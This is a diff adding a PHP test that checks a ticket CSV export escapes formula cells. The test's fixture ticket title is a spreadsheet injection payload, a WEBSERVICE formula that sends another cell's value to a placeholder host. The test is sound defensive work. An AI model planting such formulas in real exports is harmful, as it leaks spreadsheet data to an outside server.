@@ -47,6 +47,24 @@ class AnalyticsExportServiceTest extends FeatureTestCase
     }
 
     #[Test]
+    public function it_neutralises_a_formula_entered_as_a_ticket_title(): void
+    {
+        $this->createTicket(['title' => '=WEBSERVICE("http://exemplo/"&B2)']);
+
+        $path = storage_path('framework/testing/exports/injection.csv');
+
+        $this->service->exportCsvToFile($path);
+
+        $content = (string) file_get_contents($path);
+        unlink($path);
+
+        // The guarded cell is written with a leading apostrophe, so no column may start
+        // with a formula delimiter when Excel opens the file.
+        $this->assertStringContainsString("'=WEBSERVICE", $content);
+        $this->assertStringNotContainsString(';=', $content);
+    }
+
+    #[Test]
     public function it_creates_the_parent_directory_when_exporting_to_file(): void
     {
         $path = storage_path('framework/testing/exports/nested/deeper/tickets.csv');
